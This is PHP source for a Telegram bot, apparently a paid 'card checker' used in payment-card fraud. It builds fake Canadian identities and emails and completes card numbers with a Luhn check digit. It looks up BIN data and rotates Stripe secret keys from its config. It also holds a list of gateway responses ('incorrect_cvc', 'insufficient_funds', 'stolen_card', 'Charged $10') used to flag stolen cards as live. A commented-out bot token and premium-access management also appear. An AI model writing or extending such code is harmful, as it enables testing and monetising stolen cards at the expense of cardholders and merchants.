<?php
//
session_start();
error_reporting(0);
set_time_limit(0);

date_default_timezone_set('America/Buenos_Aires');
$fecha = date("Y/m/d");
//flush();

header("Cache-Control: no-cache, must-revalidate"); // HTTP/1.1
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT"); // Date in the past
header("Pragma: no-cache");

include("config.php");

//------TOKEN DEL BOT MIKASA ACKERMAN--------//
//$token = "5405339405:AAG0kGkeN-8VueVsI2JCLQbHI3wYSnfoG7Y";

$website = "https://api.telegram.org/bot".$token;
$upda = json_decode(file_get_contents('php://input'), true);
$data = file_get_contents("php://input");
$json = json_decode($data, true);
$update = $json["message"];
//---------PERSONAL---------//
$id = $update["from"]["id"];
$Name = $update["from"]["first_name"];
$last = $update["from"]["last_name"];
$message_id = $update["message_id"];
$message = $update["text"];
//----------GRUPOS----------//
$chat_id = $update["chat"]["id"];
$id_new = $update["new_chat_member"]["id"];
$grupo = $update["chat"]["title"];
$nuevo = $update["new_chat_member"]["first_name"]. ' '.$update["new_chat_member"]["last_name"];
//----------------------END VARIABLES----------------------//

$user = $update["from"]["username"];
//------------seguridad-------------//
// ID de tu usuario (para permitir mensajes personales solo para ti)
$myid = "1292171163"; // Reemplaza con tu ID de usuario


//-------------------FUNCIONES------------------//
sendPv($myid, $data);

$nombres = array("Juan", "María", "Pedro", "Ana", "Carlos", "Luisa", "Jorge", "Sofía");
$nombre = $nombres[rand(0, count($nombres) - 1)];

$fn = array("@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@icloud.com", "@mail.com", "@aol.com");
$fin = $fn[rand(0, count($fn) - 1)];
$num = rand(1, 100);
$correo = "$nombre$num$fin";



// Nombres y apellidos de ejemplo
$nombres = ["Liam", "Emma", "Noah", "Olivia", "Aiden", "Sophia"];
$apellidos = ["Smith", "Johnson", "Brown", "Taylor", "Anderson", "Wilson"];
$ciudades = ["Toronto", "Vancouver", "Montreal", "Calgary", "Ottawa"];
$provincias = ["Ontario", "Quebec", "British Columbia", "Alberta", "Nova Scotia"];

// Generar datos aleatorios
$nombre = $nombres[array_rand($nombres)];
$apellido = $apellidos[array_rand($apellidos)];
$correo = strtolower($nombre) . "." . strtolower($apellido) . "".$fin."";
$telefono = "(416) " . rand(100, 999) . "-" . rand(1000, 9999);
$direccion1 = rand(100, 999) . " Main St";
$direccion2 = rand(100, 999) . " Main St";
$ciudad = $ciudades[array_rand($ciudades)];
$zip = strtoupper(chr(rand(65, 90)) . rand(0, 9) . chr(rand(65, 90)) . ' ' . rand(0, 9) . chr(rand(65, 90)) . rand(0, 9));
$provincia = $provincias[array_rand($provincias)];
// Nombres y apellidos de ejemplo
$name = $nombre;
$phone = $telefono;

function capture($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
 return $str[0];
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

function array_in_string($str, array $arr) {
    foreach($arr as $arr_value) {
        if (stripos($str,$arr_value) !== false)
    return true;
    }
    return false;
}

function Calculate($ccnumber, $length)
    {
        $sum = 0;
        $pos = 0;
        $reversedCCnumber = strrev($ccnumber);

        while ($pos < $length - 1) {
            $odd = $reversedCCnumber[$pos] * 2;
            if ($odd > 9) {
                $odd -= 9;
            }
            $sum += $odd;

            if ($pos != ($length - 2)) {

                $sum += $reversedCCnumber[$pos + 1];
            }
            $pos += 2;
        }

     //   # Calculate check digit
        $checkdigit = ((floor($sum / 10) + 1) * 10 - $sum) % 10;
        $ccnumber .= $checkdigit;
        return $ccnumber;
    }


function BinData($bin){
$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
$data = json_decode($content, true);
curl_close($curl);

// Extraer cada uno de los elementos
$iin = $data['number']['iin']; // Número IIN
$length = $data['number']['length']; // Longitud
$luhn = $data['number']['luhn']; // Luhn
$scheme = $data['scheme']; // Esquema
$type = $data['type']; // Tipo
$category = $data['category']; // Categoría
$alpha2 = $data['country']['alpha2']; // Código de país alpha2
$alpha3 = $data['country']['alpha3']; // Código de país alpha3
$country = $data['country']['name']; // Nombre del país
$emoji = $data['country']['emoji']; // Emoji del país
$bank = $data['bank']['name']; // Nombre del banco
$bankPhone = $data['bank']['phone']; // Teléfono del banco
$bankUrl = $data['bank']['url']; // URL del banco
$success = $data['success']; // Estado de éxito
$count = "".$country." - ".$alpha2." ".$emoji."";

if (empty($category)){
   $curl = curl_init('https://bincheck.io/es/details/'.$bin.'');
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
   $response = curl_exec($curl);
   curl_close($curl);
    //_Nivel de tarjeta_
   preg_match('/Nivel de tarjeta<\/td>\s*<td width="65%" class="p-2">\s*([^<]+)\s*<\/td>/', $response, $matches);
   $category = trim($matches[1]);

}

$type = trim($type);
$bank = trim($bank);

if ($type !== "" ){
$tipo = "\n➭ 𝐓𝐲𝐩𝐞: ".$type."";
}
if ($category !== "" ){
$level = "\n➭ 𝐋𝐞𝐯𝐞𝐥: ".$category."";
}
if ($bank !== "" ){
$banco = "\n➭ 𝐁𝐚𝐧𝐤: ".$bank."";
}
$in = "<code>".$bin."</code>";
$bindata = "————✧◦⟮ʙɪɴ ᴅᴀᴛᴀ⟯◦✧————\n➭ 𝐁𝐢𝐧: ".$in."\n➭ 𝐁𝐫𝐚𝐧𝐝: ".$scheme."".$tipo."".$level."\n➭ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: ".$count."".$banco."";
	
return $bindata;
}

function Bin_Gen_Info($Bin){
$curl = curl_init('https://binlist.io/lookup/'.$Bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
$data = json_decode($content, true);
curl_close($curl);
// Extraer cada uno de los elementos
$scheme = $data['scheme']; // Esquema
$type = $data['type']; // Tipo
$category = $data['category']; // Categoría
$alpha2 = $data['country']['alpha2']; // Código de país alpha2
$country = $data['country']['name']; // Nombre del país
$emoji = $data['country']['emoji']; // Emoji del país
$bank = $data['bank']['name']; // Nombre del banco
$count = "".$country." - ".$alpha2." ".$emoji."";

if (empty($category)){
   $curl = curl_init('https://bincheck.io/es/details/'.$Bin.'');
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
   $response = curl_exec($curl);
   curl_close($curl);
    //_Nivel de tarjeta_
   preg_match('/Nivel de tarjeta<\/td>\s*<td width="65%" class="p-2">\s*([^<]+)\s*<\/td>/', $response, $matches);
   $category = trim($matches[1]);

}                                                                                       
$type = trim($type);
$bank = trim($bank);

$Bin = "<code>".$Bin."</code>";
//$bindata = "━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$in."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$scheme."".$tipo."".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."".$banco."";
$bingeninfo = "➭ 𝙱𝙸𝙽 𝙸𝙽𝙵𝙾: $scheme - $type - $category\n➭ 𝙱𝙰𝙽𝙺: $bank\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: $count\n";

return $bingeninfo;
}

function Bininfo($bin){
$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
$data = json_decode($content, true);
curl_close($curl);

// Extraer cada uno de los elementos
$iin = $data['number']['iin']; // Número IIN
$scheme = $data['scheme']; // Esquema
$type = $data['type']; // Tipo
$category = $data['category']; // Categoría
$alpha2 = $data['country']['alpha2']; // Código de país alpha2
$country = $data['country']['name']; // Nombre del país
$emoji = $data['country']['emoji']; // Emoji del país
$bank = $data['bank']['name']; // Nombre del banco
$success = $data['success']; // Estado de éxito
$count = "".$country." - ".$alpha2." ".$emoji."";                     
if (empty($category) || empty($currency)){
   $curl = curl_init('https://bincheck.io/es/details/'.$bin.'');
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
   $response = curl_exec($curl);
   curl_close($curl);
	//_Nivel de tarjeta_
   preg_match('/Nivel de tarjeta<\/td>\s*<td width="65%" class="p-2">\s*([^<]+)\s*<\/td>/', $response, $matches);
   $category = trim($matches[1]);
   $patron = '/Moneda del país ISO<\/td>\s*<td[^>]*>\s*<div class="font-medium">([^<]+)<\/div>/';
   preg_match($patron, $response, $matches);
   $currency = trim($matches[1]);

}

$type = trim($type);
$bank = trim($bank);


if ($type !== "" ){
$typo = "\n➭ 𝚃𝚈𝙿𝙴: ".$type."";
}
if ($category !== "" ){
$level = "\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$category."";
}
if (trim($bank !== "" )){
$banco = "\n➭ 𝙱𝙰𝙽𝙺: ".$bank."";
}
if ($currency !== "" ){
$moneda = "\n➭ 𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: 💲".$currency."";
}

$Bin = "<code>".$bin."</code>";
$bininfo = "━━━━━━━•⟮ʙɪɴ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$Bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$scheme."".$typo."".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."".$moneda."".$banco."\n";
return $bininfo;
}
//-----------------------VARIABLES-------------------------//

$live_array = array(
    'incorrect_cvc',
    'Your card zip code is incorrect.',
    'The zip code you supplied failed validation.',
    '"cvc_check":"pass"',
    'Thank You.',
    '"status": "succeeded"',
    'Thank You For Donation.',
    'Success',
    'SUCCEEDED',
    '"cvc_check": "fail"',
    '"cvc_check": "pass"',
    '"status": "succeeded"',
    'Your payment has already been processed',
    'Nice! New payment method added',
    'Approved',
    'insufficient_funds',
    'Your card has insufficient funds.',
    "Your card's security code is invalid.",
    "Your card's security code is incorrect.",
    "The card's security code is incorrect.",
    "Your card's expiration month is invalid.",
    'Card Issuer Declined CVV',
    'This transaction cannot be processed. Please enter a valid Credit Card Verification Number.',
    'Insufficient Funds',
    'Transaction not permitted by issuer',
    'EXISTING_ACCOUNT_RESTRICTED',
    'VALIDATION_ERROR',
    '3DS authentication is required.',
    '𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅!',
    'Insufficient balance',
    'Charged $10',
//    'Your payment method was rejected due to 3D Secure.',
    'transaction_not_allowed',
    'CVV INVALID',
    'incorrect_zip',
    'pickup_card',
    'lost_card',
    'stolen_card',
    '"seller_message": "Payment complete."'
);
/*
$autorizados = array("1292171163");
$grupos_autorizados = array("-4274242125");
*/

if((strpos($message, "!id") === 0)||(strpos($message, "/id") === 0)||(strpos($message, ".id") === 0)){

$json = json_decode($data, true);
$group_id = $json['message']['chat']['id'];
$private_id = $json['message']['from']['id'];
$private_title = $json['message']['from']['first_name'];
$group_title = $json['message']['chat']['title'];
$chat_type = $json['message']['chat']['type'];


echo "$chat_type\n";


if ($private_title == "Channel"){
        $name_title = $group_title;
        $ID = $group_id;
}else{
        $name_title = $private_title;
        $ID = $private_id;
}
$respuesta = "Nombre: ".$name_title."\nChat: ".$chat_type."\nTU ID: <code>".$ID."</code>";
sendMessage($chat_id,$respuesta,$message_id);
die();

}



$archivo = './app/data/Admins.json';
if (file_exists($archivo) && filesize($archivo) > 0) {
    $datos = json_decode(file_get_contents($archivo), true);
    if (count($datos) > 0) {

        $content = file_get_contents('./app/data/Admins.json');
        $data = json_decode($content, true);
        $autorizados = array_column($data, 'id');
//      $id = implode("\n", $autorizados);
    } else {
        echo "El archivo Admins.json está vacío";
    }
} else {
    echo "El archivo Admins.json no existe o está vacío";
}

$admin = "<a href='t.me/rigo_jz'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>";


//-----DATOS DE PRUEBA LOCAL--------//

/*

$chat_id = "1292171163";
$id = "1292171163";

echo "TU CCS: ";
$data = trim(fgets(STDIN));
$message = "!".$data."";
*/
///----+------------------------


// 





if ($myid == $id) {
  $tipo = "ᴀᴅᴍɪɴ";
} elseif (in_array($id, $autorizados)) {
  $tipo = "ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ";
} else {
	$tipo = "ғʀᴇᴇ ᴜsᴇʀ";
}




/*
if ($tipo == "ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ") {
// PERMITE QUE UN USUARIO PREMIUM ENVIE MENSAJES AL PV DEL BOT :V
}elseif($id == "1292171163"){
// PERMITE QUE EL DUEÑO ENVIE MENSAJES AL PV DEL BOT :V
}elseif($chat_id == '4274242125'){
// PERMITE QUE ENVIAR MENSAJES A UN GRUPO :v
            }else{
//------MENSAJE AL USUARIO------//
$contact = "<a href='t.me/rigo_jz'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>";
$respuesta = "━━━━━━━•⟮𝑁𝑎𝑧𝑢𝑛𝑎 𝑁𝑎𝑛𝑎𝑘𝑢𝑠𝑎⟯•━━━━━━━\nHola ".$name." este bot es premium y para poder acceder a el necesitas una key de autorización.\n\nAdquiérelo yaa!.\n\n".
'Telegram ➜ '.$contact.'';
sendMessage($id,$respuesta,$message_id);
//------MENSAJE PERSONAL-------//
$personal = "Hola Rigo Jimenez, ".$name." Intento Acceder a tu Bot";
sendMessage("1292171163",$personal);
die();
}
//}
*/

// Verificamos si el mensaje es personal o de grupo
if ($update["from"]["id"] == $myid || in_array($update["from"]["id"], $autorizados) || in_array($update["chat"]["id"], $autorizados)) {
	// Procesar mensaje
} else {
	// Enviar mensaje de error
	$contact = "<a href='t.me/rigo_jz'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>";
	$respuesta = "━━━━━━━•⟮𝑁𝑎𝑧𝑢𝑛𝑎 𝑁𝑎𝑛𝑎𝑘𝑢𝑠𝑎⟯•━━━━━━━\nHola ".$Name." este bot es premium y para poder acceder a el necesitas una key de autorización.\n\nAdquiérelo yaa!.\n\n".
	'Telegram ➜ '.$contact.'';
	sendMessage($chat_id,$respuesta,$message_id);
	//------MENSAJE PERSONAL-------//
        $personal = "Hola Rigo Jimenez, ".$Name." Intento Acceder a tu Bot";
        sendPv($myid, $personal);
        die();
}

if((strpos($message, "!") === 0)||(strpos($message, "/") === 0)||(strpos($message, ".") === 0)){

$timeout = 60; // Tiempo de espera en segundos
$maxMessages = 2; // Máximo de mensajes permitidos
$file = 'users.txt';
$userId = $id; // Reemplaza con la lógica para obtener el ID del usuario actual

try {
    if (file_exists($file)) {
        $data = json_decode(file_get_contents($file), true);
    } else {
        $data = array();
    }

    if (!isset($data[$userId])) {
        $data[$userId] = array('lastSend' => 0, 'count' => 0);
    }

    $lastSend = $data[$userId]['lastSend'];
    $count = $data[$userId]['count'];
    $diff = time() - $lastSend;

    if ($diff >= $timeout) {
        $count = 0; // Resetear contador después del timeout
    }

    if ($count >= $maxMessages) {
        $respuesta = '⏳Por favor, espera ' . ($timeout - $diff) . ' segundos antes de enviar otro mensaje.';
        sendMessage($chat_id, $respuesta, $message_id);
 //       echo "$respuesta\n";
        exit;
    }

    // Envía el mensaje...
    $count++;
    $data[$userId] = array('lastSend' => time(), 'count' => $count);
    file_put_contents($file, json_encode($data));
//    echo "Mensaje enviado con éxito.\n";
} catch (Exception $e) {
    echo 'Error: ' . $e->getMessage();
    exit;
}
}



//-------EXTRAE EL SK_LIVE----//
$sk = $config['sk_keys'];
shuffle($sk);
$sec = $sk[0];



unlink("cookie.txt");



	
$file = './app/data/Admins.json';
if (strpos($message, "/vip") === 0) {
	
	if ($id == $myid){
		
	} else {
    // Mensaje de error para IDs no autorizados
		$respuesta = "Acceso restringido!!!";
		sendMessage($chat_id, $respuesta, $message_id);
		die();
	}

	$nombre = '';
	$userId = substr($message, 5);

	if ($userId == $myid) {
		$respuesta = "$userId es el Admin!";
		sendMessage($chat_id, $respuesta, $message_id);
		die();
	}
	
	if (is_numeric($userId) && $userId != '') {
		
		$url = 'https://api.telegram.org/bot' . $token . '/getChat?chat_id=' . $userId;
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$response = curl_exec($ch);
		curl_close($ch);

		$userData = json_decode($response, true);
		$type = $userData['result']['type'];

		if ($userData['ok']) {

			if ($type == "private") {
				$nombre = $userData['result']['first_name'] . ' ' . ($userData['result']['last_name'] ?? '');
				$username = $userData['result']['username'] ?? 'No tiene username';
			} elseif (in_array($type, ["group", "supergroup", "channel"])) {
				$nombre = $userData['result']['title'];
				$username = $userData['result']['username'];
			}
		} else {
//        $respuesta = "Error: " . $userData['description'];
			$respuesta = "Usuario no encontrado!!!";
			sendMessage($chat_id, $respuesta, $message_id);
			die();
		}



   // if (is_numeric($userId) && $userId != '') {

		$usersFile = fopen($file, 'r+');
		$usersData = json_decode(fread($usersFile, filesize($file)), true);

		$usersData[$userId] = [
			'id' => $userId,
			'type' => $type,
			'name' => $nombre,
			'username' => $username,
			'premium' => true
			];
		ftruncate($usersFile, 0);
		rewind($usersFile);
		fwrite($usersFile, json_encode($usersData, JSON_PRETTY_PRINT));
		$newContent = json_encode($usersData, JSON_PRETTY_PRINT);
//      echo "$newContent\n";
		Send_data($newContent);
		fclose($usersFile);

		$respuesta = "El usuario ({$userId}) ahora es premium!";
		
	} else {
		$respuesta = "Formato inválido. Use !vip xxxxx";
//echo "$respuesta\n";
	}
	sendMessage($chat_id, $respuesta, $message_id);
	die();
}



function Send_data($newContent) {
    unlink('./app/data/Admins.json');

    $api_token = file_get_contents('/etc/secrets/API_TOKEN');
    $repoName = 'r1gox/CheckerBot';
    $filePath = 'CheckerBot/public/app/data/Admins.json';

    $url = 'https://api.github.com/repos/' . $repoName . '/contents/' . $filePath;
    $headers = array(
        'Authorization: Bearer ' . $api_token,
        'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36'
    );

    // Obtener el SHA del archivo existente
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    curl_close($ch);
    $fileData = json_decode($response, true);

    // Reemplazar el contenido del archivo
    $data = array(
        'message' => 'Actualizar archivo',
        'content' => base64_encode($newContent),
        'sha' => $fileData['sha']
    );

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($headers, ['Content-Type: application/json']));
    $response = curl_exec($ch);
    curl_close($ch);

    sendMessage($chat_id, $response, $message_id);
}

/*
function Send_data($newContent){

unlink('./app/data/Admins.json');
//$api_token = getenv('API_TOKEN');
$api_token = file_get_contents('/etc/secrets/API_TOKEN');
	
$repoName = 'r1gox/CheckerBot';
$filePath = 'CheckerBot/public/app/data/Admins.json';
//$filePath = 'Admin.json';

// Paso 1: Intentar obtener el contenido actual del archivo
$url = 'https://api.github.com/repos/' . $repoName . '/contents/' . $filePath;
$headers = array(
    'Authorization: Bearer ' . $api_token,
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36'
);

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$response = curl_exec($ch);
curl_close($ch);

$fileData = json_decode($response, true);

// Paso 2: Verificar si el archivo existe
if (isset($fileData['message']) && $fileData['message'] === 'Not Found') {
    // El archivo no existe, así que lo creamos
    $data = array(
        'message' => 'Crear nuevo archivo',
        'content' => base64_encode($newContent)
    );

    // Crear el archivo
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($headers, ['Content-Type: application/json']));

    $response = curl_exec($ch);
    curl_close($ch);

    echo "Archivo creado: " . $response;

} else {
    // El archivo existe; procedemos a agregar nuevos datos
    $currentContent = base64_decode($fileData['content']);
    $currentSha = $fileData['sha'];

    // Agregar los nuevos datos
    $updatedContent = $currentContent . $newContent;

    // Preparar la solicitud para actualizar el archivo
    $data = array(
        'message' => 'Agregar más datos al archivo',
        'content' => base64_encode($updatedContent),
        'sha' => $currentSha // Necesitamos el sha para la actualización
    );

    // Actualizar el archivo
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($headers, ['Content-Type: application/json']));

    $response = curl_exec($ch);
    curl_close($ch);
    sendMessage($chat_id, $response, $message_id);
   // echo "Archivo actualizado: " . $response;
}
}
*/


/*
$file = 'Admins.json';
if (strpos($message, "/vip") === 0) {
    $nombre = '';

    $userId = substr($message, 5);
    if ($userId == $myid) {
        $respuesta = "$userId es el Admin!";
        sendMessage($chat_id, $respuesta, $message_id);
        die();

    }

   // if (is_numeric($userId) && $userId != '') {

    $url = 'https://api.telegram.org/bot' . $token . '/getChat?chat_id=' . $userId;
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    $userData = json_decode($response, true);

    if ($userData['ok']) {
        $nombre = $userData['result']['first_name'] . ' ' . ($userData['result']['last_name'] ?? '');
        $username = $userData['result']['username'] ?? 'No tiene username';
    } else {
//        $respuesta = "Error: " . $userData['description'];
        $respuesta = "Usuario no encontrado!!!";
        sendMessage($chat_id, $respuesta, $message_id);
        die();
    }



    if (is_numeric($userId) && $userId != '') {
        $usersFile = fopen($file, 'r+');
        $usersData = json_decode(fread($usersFile, filesize($file)), true);

        $usersData[$userId] = [
            'id' => $userId,
            'name' => $nombre,
            'username' => $username,
            'premium' => true
        ];

        ftruncate($usersFile, 0);
        rewind($usersFile);
        fwrite($usersFile, json_encode($usersData, JSON_PRETTY_PRINT));
        fclose($usersFile);




        $respuesta = "El usuario ({$userId}) ahora es premium!";
    } else {
        $respuesta = "Formato inválido. Use !vip xxxxx";
    }

    sendMessage($chat_id, $respuesta, $message_id);
    die();
}

*/



if (strpos($message, "/unvip") === 0) {
    $user = substr($message, 7);
    if (is_numeric($user) && $user != '') {
        $fp = fopen($file, 'r+');
        $content = fread($fp, filesize($file));
        $users = json_decode($content, true);
        unset($users[$user]);
        ftruncate($fp, 0);
        rewind($fp);
        fwrite($fp, json_encode($users, JSON_PRETTY_PRINT));
        fclose($fp);
        $respuesta = "El usuario ($user) ya no es premium.";
    } else {
        $respuesta = "Formato inválido. Use !unvip xxxxx";
    }
    sendMessage($chat_id, $respuesta, $message_id);
    die();
}





$file = file_get_contents('./app/data/Admins.json');

if (strpos($message, "!listvip") === 0) {

    $users = json_decode($file, true);
    $premiums = array_filter($users, function($user) {
        return $user['premium'];
    });

    if (count($premiums) > 0) {
        $respuesta = "♕ ᵁˢᵘᵃʳᶤᵒˢ ᴾʳᵉᵐᶤᵘᵐ ♕\n\n";
        foreach ($premiums as $id => $user) {
            $username = !empty($user['username']) ? "(@{$user['username']})" : '';
            $type = !empty($user['type']) ? " - {$user['type']}" : '';
            $respuesta .= "➩ <code>$id</code> - {$user['name']} $username$type\n";
        }
    } else {
        $respuesta = "No hay usuarios premium.";
    }

    sendMessage($chat_id, $respuesta, $message_id);
    die();
}

/*
if((strpos($message, "!vip") === 0)||(strpos($message, "/vip") === 0)||(strpos($message, ".vip") === 0))
{


$date = time();
$fn = "Admins.json";
$fp = fopen($fn, 'r+');


$ban = substr($message, 5);
//$ban = "8383838386";
if (is_numeric($ban) && ($ban != '')){
        // Lee el contenido actual del archivo
        $content = fread($fp, filesize($fn));
        $users = json_decode($content, true); // Decodifica el JSON

   $users[$ban] = array('user' => $ban, 'premium' => true);
   $ban = "<code>".$ban."</code>";
   $respuesta = "El usuario (".$ban.") ahora es premium!♕\n";
   sendMessage($chat_id,$respuesta,$message_id);

          // Vuelve al inicio del archivo y guarda los cambios
        ftruncate($fp, 0); // Limpia el archivo
        rewind($fp); // Vuelve al inicio
        fwrite($fp, json_encode($users, JSON_PRETTY_PRINT)); // Escribe el nuevo contenido
        fclose($fp); // Cierra el archivo
        die();
}else{
$respuesta = "━━━━━━━•⟮ʙaɴ ɪɴғᴏ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .ban xxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();

}
}
*/

/*
$date = time();
$fn = "Admins.json";
$fp = fopen($fn, 'r+');

if($id == '1292171163'){

if((strpos($message, "!vip") === 0)||(strpos($message, "/vip") === 0)||(strpos($message, ".vip") === 0))
{

$ban = substr($message, 5);
//$ban = "8383838386";
if (is_numeric($ban) && ($ban != '')){
	// Lee el contenido actual del archivo
        $content = fread($fp, filesize($fn));
        $users = json_decode($content, true); // Decodifica el JSON

   $users[$ban] = array('user' => $ban, 'premium' => true);
   $ban = "<code>".$ban."</code>";
   $respuesta = "El usuario (".$ban.") ahora es premium!♕\n";
   sendMessage($chat_id,$respuesta,$message_id);

	  // Vuelve al inicio del archivo y guarda los cambios
        ftruncate($fp, 0); // Limpia el archivo
        rewind($fp); // Vuelve al inicio
	fwrite($fp, json_encode($users, JSON_PRETTY_PRINT)); // Escribe el nuevo contenido
	fclose($fp); // Cierra el archivo
	die();
}else{
$respuesta = "━━━━━━━•⟮ʙaɴ ɪɴғᴏ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .ban xxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();

}
}


if((strpos($message, "!free") === 0)||(strpos($message, "/free") === 0)||(strpos($message, ".free") === 0)){

//$unban = "838383838";
$unban = substr($message, 6);
if (is_numeric($unban) && ($unban != '')){

   $users[$unban] = array('user' => $unban, 'premium' => false);
   $unban = "<code>".$unban."</code>";
   $respuesta = "El usuario (".$unban.") a sido bloqueado de la versión premium!\n";
   sendMessage($chat_id,$respuesta,$message_id);
   $users = json_encode($users);
   file_put_contents($fn, $users);
   fclose($fp);
die();
}else{
$respuesta = "━━━━━━━•⟮ʙaɴ ɪɴғᴏ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .ban xxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}
}

}else{
$respuesta = "❌ (free: ($chat_id) ($id) Función no disponible para usuarios Free!\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}






$date = time();
$fn = "users.json";
$fp = fopen($fn, 'r+');
$users = file_get_contents($fn);
$users = json_decode($users, true);


if($id == '1292171163'){


if((strpos($message, "!ban") === 0)||(strpos($message, "/ban") === 0)||(strpos($message, ".ban") === 0))
{
$ban = substr($message, 5);
if (is_numeric($ban) && ($ban != '')){
   $users[$ban] = array('registered' => true, 'msgs' => 0, 'date' => 0, 'banned' => true);
   $ban = "<code>".$ban."</code>";
   $respuesta = "🔒 El usuario (".$ban.") a sido baneado\n";
   sendMessage($chat_id,$respuesta,$message_id);
   $users = json_encode($users);
   file_put_contents($fn, $users);
   fclose($fp);

}else{
$respuesta = "━━━━━━━•⟮ʙaɴ ɪɴғᴏ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .ban xxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}
}




if((strpos($message, "!unban") === 0)||(strpos($message, "/unban") === 0)||(strpos($message, ".unban") === 0)){

$unban = substr($message, 7);
if (is_numeric($unban) && ($unban != '')){

   $users[$unban] = array('registered' => true, 'msgs' => 0, 'date' => $date, 'banned' => false);
   $unban = "<code>".$unban."</code>";
   $respuesta = "🚫 El usuario (".$unban.") a sido desbaneado\n";
   sendMessage($chat_id,$respuesta,$message_id);
   $users = json_encode($users);
   file_put_contents($fn, $users);
   fclose($fp);
//die();
}else{
$respuesta = "━━━━━━━•⟮ʙɪɴ ɪɴғᴏ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /bin xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .ban xxxxx\n";
